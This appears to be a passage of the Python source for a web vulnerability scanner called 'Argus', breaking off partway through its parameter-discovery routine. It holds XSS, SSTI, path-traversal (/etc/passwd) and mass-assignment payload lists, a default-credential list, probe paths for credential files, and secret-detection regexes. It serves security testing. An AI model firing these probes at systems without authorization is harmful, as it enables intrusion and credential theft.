"""
Comprehensive Web Application Scanner

Integrates advanced web scanning capabilities:
- Security headers audit
- CSP analysis
- Cookie security
- CORS analysis
- XSS testing
- LFI/Path traversal
- SSTI detection
- Command injection
- XXE testing
- Host header injection
- JS secret scanning
- Authentication testing
- Mass assignment
- Open redirect detection
- Debug endpoint detection
- Sensitive file detection
"""
import contextlib
import json
import logging
import os
import re
import socket
import threading
import time
from urllib.parse import urljoin, urlparse

import requests
import urllib3
from requests.exceptions import ConnectionError, RequestException, Timeout

from config.constants import (
    LLM_MAX_GENERATED_PAYLOADS,
    MAX_PAGES_TO_CRAWL,
    MAX_PARAMETERS_TO_FUZZ,
    RATE_LIMIT_DELAY_MS,
    SSL_TIMEOUT,
)
from tools.web_scanner_checks._helpers import test_jwt_alg_none
from utils.logging_utils import ScanLogger

logger = logging.getLogger(__name__)


class WebScanner:
    """
    Comprehensive web application vulnerability scanner.
    Performs security configuration checks and active vulnerability testing.
    """

    # Security headers to check
    SECURITY_HEADERS = [
        "Strict-Transport-Security",
        "X-Frame-Options",
        "X-Content-Type-Options",
        "Referrer-Policy",
        "Permissions-Policy",
        "X-XSS-Protection",
        "Content-Security-Policy",
    ]

    # Sensitive file patterns
    SENSITIVE_FILES = [
        ".env", ".git/config", ".git/HEAD", ".git/COMMIT_EDITMSG",
        "config.php", "wp-config.php", ".DS_Store",
        "credentials.json", "secrets.yml", ".aws/credentials",
        "id_rsa", "docker-compose.yml", ".htpasswd",
        "database.yml", "settings.py", ".npmrc", ".pypirc",
        "robots.txt", "sitemap.xml", "swagger.json", "openapi.json",
        "/actuator", "/actuator/env", "/actuator/health",
        "/debug", "/_debug", "/console", "/__debug__",
        "/phpinfo.php", "/info.php", "/_profiler",
        "/.well-known/security.txt", "/server-status",
        "/wp-admin/", "/admin/", "/phpmyadmin/",
        "/api/v1", "/api/v2", "/graphql",
    ]

    # JS secret patterns
    JS_SECRET_PATTERNS = [
        (r'(?:api[_-]?key|apikey|api[_-]?token)\s*[:=]\s*["\']([a-zA-Z0-9_\-]{16,})["\']', "API_KEY"),
        (r'(?:token|access[_-]?token|auth[_-]?token|bearer)\s*[:=]\s*["\']([a-zA-Z0-9_\-\.]{20,})["\']', "AUTH_TOKEN"),
        (r'(?:secret|secret[_-]?key|client[_-]?secret)\s*[:=]\s*["\']([a-zA-Z0-9_\-]{16,})["\']', "SECRET_KEY"),
        (r'(?:password|passwd|pwd)\s*[:=]\s*["\']([^"\']{4,})["\']', "HARDCODED_PASSWORD"),
        (r'(AKIA|ABIA|ACCA|ASIA)[A-Z0-9]{16}', "AWS_ACCESS_KEY"),
        (r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', "JWT_TOKEN"),
        (r'(?:private[_-]?key|encryption[_-]?key)\s*[:=]\s*["\']([^"\']{16,})["\']', "ENCRYPTION_KEY"),
        (r'-----BEGIN\s+(?:RSA\s+)?PRIVATE\s+KEY-----', "PRIVATE_KEY"),
        (r'(?:database[_-]?url|db[_-]?url|connection[_-]?string)\s*[:=]\s*["\']([^"\']+)["\']', "DATABASE_URL"),
        (r'(?:webhook[_-]?url|webhook[_-]?secret)\s*[:=]\s*["\']([^"\']+)["\']', "WEBHOOK_SECRET"),
    ]

    # XSS payloads
    XSS_PAYLOADS = [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        "javascript:alert(1)",
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '{{7*7}}',
        '${7*7}',
        "'\"><img src=x onerror=alert(1)>",
        '<body onload=alert(1)>',
    ]

    # SSTI payloads
    SSTI_PAYLOADS = [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '#{7*7}',
        '*{7*7}',
    ]

    # LFI payloads
    LFI_PAYLOADS = [
        '../../../../etc/passwd',
        '....//....//etc/passwd',
        '%2e%2e%2fetc%2fpasswd',
        '..%252fetc%252fpasswd',
        'php://filter/convert.base64-encode/resource=/etc/passwd',
    ]

    # Host header injection targets
    HOST_INJECTION = [
        "evil.com",
        "attacker.com",
        "127.0.0.1",
        "localhost",
    ]

    # Open redirect parameters
    REDIRECT_PARAMS = [
        "redirect", "url", "next", "dest", "redirect_url",
        "return", "continue", "to", "ref", "dest_url", "target", "goto",
    ]

    # Mass assignment payloads
    MASS_ASSIGN_PAYLOADS = [
        '{"role":"admin"}',
        '{"is_admin":true}',
        '{"admin":1}',
        '{"privilege":"superuser"}',
        '{"verified":true}',
    ]

    # Default credentials
    DEFAULT_CREDS = [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "123456"),
        ("admin", "admin123"),
        ("root", "root"),
        ("test", "test"),
        ("guest", "guest"),
        ("admin", "letmein"),
    ]
    ENABLE_CREDENTIAL_TESTING = False  # Disabled by default for safety

    # GraphQL endpoints to check
    GRAPHQL_ENDPOINTS = [
        "/graphql",
        "/api/graphql",
        "/v1/graphql",
        "/query",
    ]

    # OpenAPI/Swagger paths to check
    OPENAPI_PATHS = [
        "/.well-known/openapi",
        "/api-docs",
        "/swagger.json",
        "/openapi.json",
        "/api/swagger.json",
        "/api/openapi.json",
    ]

    # Prototype pollution payloads
    PROTOTYPE_POLLUTION_PAYLOADS = [
        "?__proto__[isAdmin]=true",
        "?constructor[prototype][isAdmin]=true",
    ]

    # Cache poisoning headers
    CACHE_POISONING_HEADERS = {
        "X-Forwarded-For": "127.0.0.1",
        "X-Original-Forwarded-For": "127.0.0.1",
    }

    # Financial / transaction paths for business logic checks
    TRANSFER_PATHS = [
        "/api/transfer", "/api/transactions", "/api/payment",
        "/api/v1/transfers", "/api/send",
    ]

    # File upload endpoints
    UPLOAD_PATHS = [
        "/api/upload", "/api/profile/image", "/api/documents",
        "/api/v1/upload", "/upload",
    ]

    # Rate limiting sensitive paths
    RATE_LIMIT_PATHS = [
        "/api/login", "/api/auth/login", "/api/reset-password",
        "/api/transfer", "/api/payment",
    ]

    # Password reset endpoints
    RESET_PATHS = [
        "/api/forgot-password", "/api/reset-password", "/api/auth/reset",
    ]

    # Race condition test endpoints
    RACE_PATHS = [
        "/api/transfer", "/api/payment", "/api/card/fund", "/api/withdraw",
    ]

    # Sensitive response fields (BOPLA — should not appear in regular user responses)
    SENSITIVE_RESPONSE_FIELDS = {
        "password", "password_hash", "hashed_password", "pwd",
        "card_number", "pan", "cvv", "cvv2", "cvc",
        "secret", "api_key", "access_token", "refresh_token",
        "ssn", "social_security", "pin", "credit_score",
        "is_admin", "admin", "role", "privilege", "is_superuser",
    }

    def __init__(self, timeout: int = SSL_TIMEOUT, rate_limit: float = RATE_LIMIT_DELAY_MS / 1000.0,
                 llm_payload_generator=None, session: requests.Session | None = None,
                 tech_stack: list[str] | None = None, verify: bool = True,
                 engagement_id: str = "", user_agent: str = ""):
        """
        Initialize web scanner.

        Args:
            timeout: Request timeout in seconds
            rate_limit: Seconds between requests
            llm_payload_generator: Optional LLMPayloadGenerator for context-aware payloads
            session: Optional pre-authenticated requests.Session
            tech_stack: Detected technology stack from recon (e.g. ["WordPress", "PHP", "jQuery"])
            verify: Verify SSL certificates
            engagement_id: Engagement ID for log/trace correlation
            user_agent: Custom User-Agent string (falls back to WEB_SCANNER_USER_AGENT env or default)
        """
        self.timeout = timeout
        self.rate_limit = rate_limit
        self.llm_payload_generator = llm_payload_generator
        self.tech_stack = tech_stack or []
        self.verify = verify
        self.engagement_id = engagement_id
        self.session = session or requests.Session()
        _default_ua = "Argus-Scanner/1.0 (security-automation)"
        _ua = user_agent or os.environ.get("WEB_SCANNER_USER_AGENT", _default_ua)
        self.session.headers.setdefault("User-Agent", _ua)
        self.session.headers.setdefault("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
        self.session.headers.setdefault("Accept-Language", "en-US,en;q=0.5")
        self.findings = []
        self.discovered_parameters = None  # Initialized before parameter_discovery()
        self._last_request_time = 0.0  # For token-bucket rate limiting
        self._rate_lock = threading.Lock()  # Thread safety for rate limiting
        self.slog = ScanLogger("web_scanner", engagement_id=self.engagement_id)

    @staticmethod
    def _redact_for_llm(text: str) -> str:
        """Redact sensitive data before sending to LLM provider.

        Strips potential secrets (tokens, passwords, keys, internal URLs)
        from HTTP response snippets to prevent data exfiltration.
        """
        import re as _re
        # Redact common credential patterns
        text = _re.sub(r'(?i)(api[_-]?key|secret|token|password|passwd|auth|credential)\s*[:=]\s*["\']?[^\s"\'&]+', r'\1=__REDACTED__', text)
        # Redact bearer tokens
        text = _re.sub(r'(?i)(bearer\s+)[a-z0-9_.-]{20,}', r'\1__REDACTED__', text)
        # Redact AWS keys
        text = _re.sub(r'(?i)(AKIA[0-9A-Z]{16})', '__AWS_KEY_REDACTED__', text)
        # Redact internal IPs
        text = _re.sub(r'\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2[0-9]|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b', 'INTERNAL_IP_REDACTED', text)
        return text[:500]

    def scan(self, target_url: str) -> list[dict]:
        """
        Run comprehensive scan against target.

        Args:
            target_url: Target URL to scan

        Returns:
            List of vulnerability findings
        """
        self.findings = []
        self.target_url = target_url.rstrip("/")

        self.slog.phase_header("WEB SCAN", target=self.target_url)
        logger.info(f"Starting comprehensive web scan: {self.target_url}")

        from concurrent.futures import ThreadPoolExecutor, as_completed

        checks = [
            self.check_security_headers,
            self.check_csp,
            self.check_cookies,
            self.check_cors,
            self.parameter_discovery,
            self.parameter_fuzzing,
            self.check_sensitive_files,
            self.check_js_secrets,
            self.check_open_redirects,
            self.check_host_header_injection,
            self.check_verb_tampering,
            self.check_debug_endpoints,
            self.check_auth_endpoints,
            self.check_mass_assignment,
            self.check_xss,
            self.check_ssti,
            self.check_lfi,
            self.check_xxe,
            self.check_graphql_introspection,
            self.check_financial_logic,
            self.check_file_upload,
            self.check_token_storage,
            self.check_session_expiration,
            self.check_password_reset_strength,
            self.check_rate_limiting,
            self.check_race_conditions,
            self.check_bopla,
            self.check_predictable_identifiers,
            self.check_jwt_algorithm_confusion,
            self.check_prototype_pollution,
            self.check_cache_poisoning,
            self.check_http_request_smuggling,
            self.check_dom_xss,
            self.check_openapi_discovery,
            self.differential_analysis,
            self.detect_waf,
            self.time_based_detection,
            self.ssl_verify,
            self.response_analysis,
        ]

        with ThreadPoolExecutor(max_workers=6) as pool:
            futures = {pool.submit(check): check.__name__ for check in checks}
            try:
                for future in as_completed(futures, timeout=300):
                    try:
                        future.result(timeout=10)
                    except Exception as e:
                        logger.warning(f'{futures[future]} failed: {e}')
            except TimeoutError:
                logger.warning("WebScanner check batch timed out")

        logger.info(f"Scan complete: {len(self.findings)} findings")
        return self.findings

    def _safe_request(self, method: str, url: str, session: requests.Session | None = None, **kwargs) -> requests.Response | None:
        """Make HTTP request with error handling. Thread-safe — uses per-thread sessions.

        Args:
            session: Optional pre-authenticated session. When provided, it is used
                     instead of the thread-local session (carries cookies/auth headers).
        """
        try:
            kwargs.setdefault("timeout", self.timeout)
            kwargs.setdefault("allow_redirects", True)
            kwargs.setdefault("verify", self.verify)  # Verify SSL certs by default
            # Use provided session, or fall back to thread-local
            if session is not None:
                req_session = session
            else:
                if not hasattr(self, "_thread_session"):
                    self._thread_session = threading.local()
                req_session = getattr(self._thread_session, "session", None)
                if req_session is None:
                    req_session = requests.Session()
                    req_session.headers.update({
                        "User-Agent": "Mozilla/5.0 (compatible; Argus/1.0)",
                        "Accept": "*/*",
                    })
                    self._thread_session.session = req_session
            # Token-bucket rate limiting with thread-safe lock
            with self._rate_lock:
                now = time.time()
                wait_time = self._last_request_time + self.rate_limit - now
                if wait_time > 0:
                    time.sleep(wait_time)
                self._last_request_time = time.time()
            resp = req_session.request(method, url, **kwargs)
            return resp
        except (TimeoutError, RequestException, Timeout, ConnectionError, urllib3.exceptions.SSLError) as e:
            logger.debug(f"Request failed: {e}")
            return None

    def _add_finding(self, finding_type: str, severity: str, endpoint: str,
                     evidence: dict, confidence: float = 0.8):
        """Add a finding to the results with sanitized evidence."""
        # Import sanitization utilities
        try:
            from utils.sanitization import sanitize_evidence
            sanitized_evidence = sanitize_evidence(evidence)
        except ImportError:
            # If sanitization not available, use evidence as-is
            sanitized_evidence = evidence

        self.findings.append({
            "type": finding_type,
            "severity": severity,
            "endpoint": endpoint,
            "evidence": sanitized_evidence,
            "confidence": confidence,
            "source_tool": "web_scanner",
        })

    def _detect_framework(self, response) -> str:
        """
        Detect web framework from HTTP response headers and content.

        Args:
            response: HTTP response object

        Returns:
            Framework name string or "unknown"
        """
        if not response:
            return "unknown"

        headers = {k.lower(): v for k, v in response.headers.items()}
        body = response.text[:2000].lower() if response.text else ""

        # Check headers — wrap with str() to handle int header values
        powered_by = str(headers.get("x-powered-by", "")).lower()
        if "django" in body or "csrfmiddlewaretoken" in body:
            return "Django"
        if powered_by:
            if "express" in powered_by:
                return "Express"
            if "asp.net" in powered_by:
                return "ASP.NET"
            if "php" in powered_by:
                return "PHP"
            if "rails" in powered_by or "ruby" in powered_by:
                return "Rails"

        # Check server header — wrap with str() to handle int values
        server = str(headers.get("server", "")).lower()
        if "nginx" in server:
            return "nginx"
        if "apache" in server:
            return "Apache"
        if "iis" in server or "microsoft-iis" in server:
            return "IIS"

        # Check body for framework indicators
        if "laravel" in body or "livewire" in body:
            return "Laravel"
        if "spring" in body or "javax.faces" in body:
            return "Spring"
        if "react" in body or "reactroot" in body:
            return "React"
        if "vue" in body or "vuejs" in body or "vueroot" in body:
            return "Vue"
        if "angular" in body or "ng-" in body:
            return "Angular"
        if "next" in body or "__next" in body or "nextjs" in body:
            return "Next.js"
        if "nuxt" in body:
            return "Nuxt"
        if "wordpress" in body or "wp-" in body or "wp-content" in body:
            return "WordPress"
        if "drupal" in body:
            return "Drupal"
        if "joomla" in body:
            return "Joomla"
        if "shopify" in body:
            return "Shopify"
        if "magento" in body:
            return "Magento"

        return "unknown"

    def _tech_hints(self, resp) -> str:
        """
        Combined technology hints from runtime detection + recon tech_stack.

        Args:
            resp: HTTP response object for runtime framework detection

        Returns:
            Comma-separated technology hints string (e.g. "WordPress, PHP, jQuery")
        """
        hints = self._detect_framework(resp)
        if self.tech_stack:
            extra = ", ".join(self.tech_stack[:8])
            if hints != "unknown":
                return f"{hints}, {extra}"
            return extra
        return hints

    def check_security_headers(self):
        """Check for missing security headers."""
        resp = self._safe_request("GET", self.target_url)
        if not resp:
            return

        headers = {k.lower(): v for k, v in resp.headers.items()}
        missing = []

        for header in self.SECURITY_HEADERS:
            if header.lower() not in headers:
                missing.append(header)

        if missing:
            self._add_finding(
                finding_type="MISSING_SECURITY_HEADERS",
                severity="MEDIUM",
                endpoint=self.target_url,
                evidence={
                    "missing_headers": missing,
                    "present_headers": [h for h in self.SECURITY_HEADERS if h.lower() in headers],
                },
                confidence=0.95,
            )

    def check_csp(self):
        """Analyze Content-Security-Policy for weaknesses."""
        resp = self._safe_request("GET", self.target_url)
        if not resp:
            return

        csp = resp.headers.get("Content-Security-Policy", "")
        if not csp:
            self._add_finding(
                finding_type="MISSING_CSP",
                severity="MEDIUM",
                endpoint=self.target_url,
                evidence={"message": "No Content-Security-Policy header found"},
                confidence=0.95,
            )
            return

        # Check for unsafe directives
        unsafe = []
        if "unsafe-inline" in csp:
            unsafe.append("unsafe-inline")
        if "unsafe-eval" in csp:
            unsafe.append("unsafe-eval")
        if "*." in csp or "*:" in csp:
            unsafe.append("wildcard domains")

        if unsafe:
            self._add_finding(
                finding_type="WEAK_CSP",
                severity="MEDIUM",
                endpoint=self.target_url,
                evidence={
                    "unsafe_directives": unsafe,
                    "csp_preview": csp[:200],
                },
                confidence=0.9,
            )

    def check_cookies(self):
        """Check cookie security attributes."""
        resp = self._safe_request("GET", self.target_url)
        if not resp:
            return

        # Get Set-Cookie headers - use getlist for multi-value headers
        cookie_headers = resp.raw.headers.getlist("Set-Cookie") if hasattr(resp.raw.headers, "getlist") else []
        if not cookie_headers:
            cookie_header = resp.headers.get("Set-Cookie")
            if not cookie_header:
                return
            # Fallback: use http.cookies to parse multi-cookie headers safely
            from http.cookies import SimpleCookie
            try:
                parsed = SimpleCookie(cookie_header)
                cookie_headers = [c.output(header="", sep="").strip() for c in parsed.values()]
            except Exception:
                # Last resort: split on newlines if present
                cookie_headers = cookie_header.split("\n") if "\n" in cookie_header else [cookie_header]

        for cookie_str in cookie_headers:
            issues = []
            if "HttpOnly" not in cookie_str:
                issues.append("Missing HttpOnly")
            if "Secure" not in cookie_str:
                issues.append("Missing Secure")
            if "SameSite" not in cookie_str:
                issues.append("Missing SameSite")

            if issues:
                cookie_name = cookie_str.split("=")[0] if "=" in cookie_str else "unknown"
                self._add_finding(
                    finding_type="INSECURE_COOKIE",
                    severity="MEDIUM",
                    endpoint=self.target_url,
                    evidence={
                        "cookie": cookie_name,
                        "issues": issues,
                    },
                    confidence=0.9,
                )

    def check_cors(self):
        """Check for CORS misconfigurations."""
        resp = self._safe_request(
            "GET", self.target_url,
            headers={"Origin": "http://evil.com"}
        )
        if not resp:
            return

        acao = resp.headers.get("Access-Control-Allow-Origin", "")
        acac = resp.headers.get("Access-Control-Allow-Credentials", "")

        if acao == "*":
            self._add_finding(
                finding_type="WILDCARD_CORS",
                severity="HIGH",
                endpoint=self.target_url,
                evidence={
                    "Access-Control-Allow-Origin": "*",
                    "message": "Wildcard CORS allows any origin",
                },
                confidence=0.9,
            )
        elif acao == "http://evil.com":
            acac_str = str(acac) if acac is not None else ""
            severity = "CRITICAL" if acac_str.lower() == "true" else "HIGH"
            self._add_finding(
                finding_type="REFLECTED_ORIGIN_CORS",
                severity=severity,
                endpoint=self.target_url,
                evidence={
                    "Access-Control-Allow-Origin": acao,
                    "Access-Control-Allow-Credentials": acac,
                    "message": "Server reflected evil.com origin",
                },
                confidence=0.9,
            )

    def check_sensitive_files(self):
        """Check for exposed sensitive files with improved validation."""
        # File signatures to validate actual content
        file_signatures = {
            ".env": [b"=", b"API", b"SECRET", b"DATABASE_URL"],
            ".git/config": b"[core]",
            ".git/HEAD": b"ref: refs/",
            ".git/COMMIT_EDITMSG": b"commit ",
            "credentials.json": b"api",
            ".aws/credentials": b"[default]",
            "id_rsa": b"PRIVATE KEY",
            "wp-config.php": b"<?php",
            "config.php": b"<?php",
            ".htpasswd": b"$apr",
            "database.yml": b"database:",
            "secrets.yml": b"secret:",
            "docker-compose.yml": b"version:",
            "settings.py": b"import ",
            ".npmrc": b"registry",
            ".pypirc": b"[distutils]",
        }

        # Text that indicates NOT_FOUND / custom 404 (even with HTTP 200)
        # These patterns mean the file doesn't actually exist
        not_found_patterns = [
            "not found", "does not exist", "page not found",
            "return to", "go back", "homepage",
            "invalid url", "wrong url", "url not found",
            "nothing here", "no such page", "page does not",
        ]

        for path in self.SENSITIVE_FILES:
            url = urljoin(self.target_url, path.lstrip("/"))
            resp = self._safe_request("GET", url)
            if not resp or resp.status_code != 200:
                continue

            content = resp.text

            # Need substantial content
            if len(content) < 50:
                continue

            # CRITICAL CHECK: Custom 404 that says "not found" (even with HTTP 200)
            content_lower = content.lower()
            is_custom_404 = any(pattern in content_lower for pattern in not_found_patterns)

            if is_custom_404:
                logger.debug(f"Skipping {path} - custom 404 (not actually exposed)")
                continue

            # CRITICAL CHECK: Must not be HTML (SPA catch-all false positive)
            content_first100 = content[:100].lower()
            html_signatures = [b"<!doctype html", b"<html", b"scroll-smooth"]
            is_html_response = any(sig in content_first100.encode() for sig in html_signatures)

            if is_html_response:
                # This is a false positive - the server returns HTML for all paths
                logger.debug(f"Skipping {path} - returns HTML (not actually exposed)")
                continue

            # Check for file-specific signatures
            expected_signatures = file_signatures.get(path, [])
            if expected_signatures:
                content_bytes = content.encode('utf-8', errors='ignore')
                has_signature = any(sig in content_bytes for sig in expected_signatures)
            else:
                # For unknown files, check it's not HTML and has reasonable content
                has_signature = len(content) > 100

            if has_signature:
                # Calculate confidence based on how specific the match is
                confidence = 0.95 if expected_signatures else 0.6
                self._add_finding(
                    finding_type="EXPOSED_SENSITIVE_FILE",
                    severity="HIGH",
                    endpoint=url,
                    evidence={
                        "file": path,
                        "status_code": resp.status_code,
                        "content_length": len(content),
                        "content_preview": content[:200],
                        "verified": bool(expected_signatures),
                    },
                    confidence=confidence,
                )

    def check_js_secrets(self):
        """Scan JavaScript files for secrets."""
        resp = self._safe_request("GET", self.target_url)
        if not resp:
            return

        # Find JS file references
        js_urls = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', resp.text)

        # Also check inline scripts
        inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', resp.text, re.DOTALL)

        # Scan inline scripts
        for script in inline_scripts:
            if len(script) > 50:  # Skip tiny scripts
                self._scan_content_for_secrets(script, self.target_url + "/inline-script")

        # Scan external JS files (limit to first 10)
        for js_url in js_urls[:MAX_PAGES_TO_CRAWL]:
            if not js_url.startswith("http"):
                js_url = urljoin(self.target_url, js_url)

            js_resp = self._safe_request("GET", js_url)
            if js_resp and js_resp.status_code == 200:
                self._scan_content_for_secrets(js_resp.text, js_url)

    def _scan_content_for_secrets(self, content: str, source: str):
        """Scan content for secret patterns."""
        for pattern, secret_type in self.JS_SECRET_PATTERNS:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                # Mask the secrets
                masked = []
                for m in matches[:3]:  # Limit to 3
                    if len(m) > 8:
                        masked.append(m[:4] + "..." + m[-4:])
                    else:
                        masked.append("***")

                self._add_finding(
                    finding_type="EXPOSED_SECRET",
                    severity="CRITICAL",
                    endpoint=source,
                    evidence={
                        "secret_type": secret_type,
                        "matches_found": len(matches),
                        "masked_values": masked,
                    },
                    confidence=0.85,
                )

    def check_open_redirects(self):
        """Check for open redirect parameters."""
        resp = self._safe_request("GET", self.target_url)
        if not resp:
            return

        # Find URLs with redirect parameters
        url_params = re.findall(r'[?&](\w+)=', resp.text)

        for param in self.REDIRECT_PARAMS:
            if param in url_params or param in resp.text.lower():
                # Test the parameter
                test_url = f"{self.target_url}?{param}=http://evil.com"
                test_resp = self._safe_request("GET", test_url, allow_redirects=False)
                if test_resp and test_resp.status_code in (301, 302, 303, 307, 308):
                    location = test_resp.headers.get("Location", "")
                    if "evil.com" in location:
                        self._add_finding(
                            finding_type="OPEN_REDIRECT",
                            severity="HIGH",
                            endpoint=test_url,
                            evidence={
                                "parameter": param,
                                "redirect_to": location,
                                "status_code": test_resp.status_code,
                            },
                            confidence=0.8,
                        )

    def check_host_header_injection(self):
        """Check for host header injection."""
        for host in self.HOST_INJECTION:
            resp = self._safe_request(
                "GET", self.target_url,
                headers={"Host": host}
            )
            if resp:
                # Check if response reflects the injected host
                if host.lower() in resp.text.lower():
                    self._add_finding(
                        finding_type="HOST_HEADER_INJECTION",
                        severity="HIGH",
                        endpoint=self.target_url,
                        evidence={
                            "injected_host": host,
                            "reflected_in_response": True,
                        },
                        confidence=0.75,
                    )
                    break

                # Check Location header
                location = resp.headers.get("Location", "")
                if host.lower() in location.lower():
                    self._add_finding(
                        finding_type="HOST_HEADER_INJECTION",
                        severity="HIGH",
                        endpoint=self.target_url,
                        evidence={
                            "injected_host": host,
                            "redirect_to": location,
                        },
                        confidence=0.8,
                    )
                    break

    def check_verb_tampering(self):
        """Check for HTTP verb tampering."""
        methods = ["TRACE", "DELETE", "PUT", "PATCH", "OPTIONS"]

        for method in methods:
            resp = self._safe_request(method, self.target_url)
            # TRACE method specifically is dangerous
            if resp and resp.status_code not in (405, 404, 403, 501) and method == "TRACE":
                    self._add_finding(
                        finding_type="HTTP_VERB_TAMPERING",
                        severity="MEDIUM",
                        endpoint=self.target_url,
                        evidence={
                            "method": method,
                            "status_code": resp.status_code,
                            "message": f"Server accepts {method} method",
                        },
                        confidence=0.8,
                    )

    def check_debug_endpoints(self):
        """Check for exposed debug/admin endpoints with improved validation."""
        debug_paths = [
            "/debug", "/_debug", "/console", "/actuator",
            "/actuator/env", "/actuator/health", "/__debug__",
            "/phpinfo.php", "/info.php", "/_profiler",
            "/server-status", "/.env",
        ]

        # Content signatures for actual debug pages
        debug_signatures = {
            "/phpinfo.php": [b"php version", b"PHP_VERSION"],
            "/info.php": [b"php version", b"PHP_VERSION"],
            "/actuator/env": [b"spring", b"application", b"property"],
            "/actuator/health": [b"status", b"UP", b"DOWN"],
            "/actuator": [b"href", b"env", b"health"],
            "/server-status": [b"Server Status", b"Apache", b"nginx"],
        }

        # HTML signatures that indicate SPA catch-all
        html_signatures = [b"<!DOCTYPE html", b"<html", b"<!DOCTYPE", b"scroll-smooth"]

        for path in debug_paths:
            url = urljoin(self.target_url, path.lstrip("/"))
            resp = self._safe_request("GET", url)
            if not resp or resp.status_code != 200:
                continue

            content = resp.text
            content_lower = content.lower()

            # Must have substantial content
            if len(content) < 100:
                continue

            # CRITICAL CHECK: Must not be HTML (SPA catch-all false positive)
            content_first100 = content[:100].lower().encode()
            is_html_response = any(html_sig in content_first100 for html_sig in html_signatures)

            if is_html_response:
                logger.debug(f"Skipping {path} - returns HTML (not actually exposed)")
                continue

            # Check for actual debug indicators
            debug_indicators = ["debug", "stack trace", "exception",
                              "phpinfo", "profiler", "actuator"]

            has_debug_content = any(indicator in content_lower for indicator in debug_indicators)

            # Or check specific signatures
            signatures = debug_signatures.get(path, [])
            if signatures:
                content_bytes = content.encode('utf-8', errors='ignore')
                has_signature = any(sig in content_bytes for sig in signatures)
            else:
                has_signature = has_debug_content

            # Also check for HTML forms (potential debug consoles)
            is_console = "function" in content_lower and "eval" in content_lower

            if has_debug_content or has_signature or is_console:
                confidence = 0.9 if (signatures or has_debug_content) else 0.7
                self._add_finding(
                    finding_type="EXPOSED_DEBUG_ENDPOINT",
                    severity="HIGH",
                    endpoint=url,
                    evidence={
                        "path": path,
                        "status_code": resp.status_code,
                        "content_preview": content[:200],
                        "verified": bool(signatures),
                    },
                    confidence=confidence,
                )

    def check_auth_endpoints(self):
        """Check for authentication endpoints and test default credentials."""
        auth_paths = [
            "/login", "/signin", "/auth", "/admin", "/dashboard",
            "/api/auth/login", "/api/login", "/wp-login.php",
        ]

        for path in auth_paths:
            url = urljoin(self.target_url, path.lstrip("/"))

                    # Check if endpoint exists
            resp = self._safe_request("GET", url)
            if resp and resp.status_code in (200, 302):
                # Test default credentials
                if self.ENABLE_CREDENTIAL_TESTING:
                    for username, password in self.DEFAULT_CREDS[:3]:  # Limit to 3
                        login_resp = self._safe_request(
                            "POST", url,
                            data={"username": username, "password": password},
                            allow_redirects=False,
                        )
                        if login_resp and login_resp.status_code in (200, 302):
                            # Check if login was successful (redirect to dashboard, etc.) — wrap with str() for int values
                            location = str(login_resp.headers.get("Location", "")).lower()
                            if any(x in location for x in ["dashboard", "admin", "home", "welcome"]):
                                self._add_finding(
                                    finding_type="DEFAULT_CREDENTIALS",
                                    severity="CRITICAL",
                                    endpoint=url,
                                    evidence={
                                        "username": username,
                                        "password": password,
                                        "redirect_to": location,
                                    },
                                    confidence=0.7,
                                )
                break

    def parameter_discovery(self):
        """
        Discover input parameters from forms, URLs, JSON, and JavaScript.

        Crawls the target site (up to max_pages) and extracts URL query
        parameters, form input names, JSON keys from inline scripts, and
        JavaScript variable names. Discovered parameters are stored in
        self.discovered_parameters for use by subsequent tests.

        Returns:
            None. Findings are appended to self.findings.
        """
        logger.info("Running parameter discovery")

        # Initialize early so parameter_fuzzing() doesn't fail if we raise below
        self.discovered_parameters = {"url_parameters": [], "form_parameters": [],
                                       "json_parameters": [], "javascript_parameters": []}

        discovered = {
            "url_parameters": set(),
            "form_parameters": set(),
            "json_parameters": set(),
            "javascript_parameters": set(),
        }

        # Crawl main page and linked pages
        to_crawl = [self.target_url]
        crawled = set()
        max_pages = MAX_PAGES_TO_CRAWL

        while to_crawl and len(crawled) < max_pages:
            url = to_crawl.pop(0)
            if url in crawled:
                continue
            crawled.add(url)

            resp = self._safe_request("GET", url)
            if not resp:
                continue

            # Extract URL parameters
            url_params = re.findall(r'[?&](\w+)=', url)
            discovered["url_parameters"].update(url_params)

            # Extract form parameters
            form_inputs = re.findall(
                r'<input[^>]*name=["\']([^"\']+)["\']',
                resp.text,
                re.IGNORECASE,
            )
            discovered["form_parameters"].update(form_inputs)

            form_selects = re.findall(
                r'<select[^>]*name=["\']([^"\']+)["\']',
                resp.text,
                re.IGNORECASE,
            )
            discovered["form_parameters"].update(form_selects)

            # Extract JSON keys from inline scripts
            script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', resp.text, re.DOTALL | re.IGNORECASE)
            script_content = ' '.join(script_blocks)
            json_keys = set(re.findall(r'["\'](\w+)["\']\s*:\s*', script_content))
            if not json_keys:
                json_keys = set(re.findall(r'["\'](\w+)["\']\s*:\s*', resp.text)[:50])
            discovered["json_parameters"].update(json_keys)

            # Extract JavaScript variables that might be parameters
            js_vars = re.findall(
                r'(?:var|let|const)\s+(\w+)\s*=',
                resp.text,
            )
            discovered["javascript_parameters"].update(js_vars)

            # Extract links to crawl further
            links = re.findall(
                r'href=["\']([^"\']+)["\']',
                resp.text,
                re.IGNORECASE,
            )
            for link in links:
                absolute = urljoin(url, link)
                if absolute.startswith(self.target_url) and absolute not in crawled:
                    to_crawl.append(absolute)

        # Store discovered parameters for use by other checks
        self.discovered_parameters = {
            key: list(values)
            for key, values in discovered.items()
        }

        # Add finding if parameters were discovered
        total = sum(len(v) for v in self.discovered_parameters.values())
        if total > 0:
            self._add_finding(
                finding_type="PARAMETER_DISCOVERY",
                severity="INFO",
                endpoint=self.target_url,
                evidence={
                    "total_discovered": total,
                    "url_parameters": self.discovered_parameters["url_parameters"][:20],
                    "form_parameters": self.discovered_parameters["form_parameters"][:20],
                    "json_parameters": self.discovered_parameters["json_parameters"][:20],
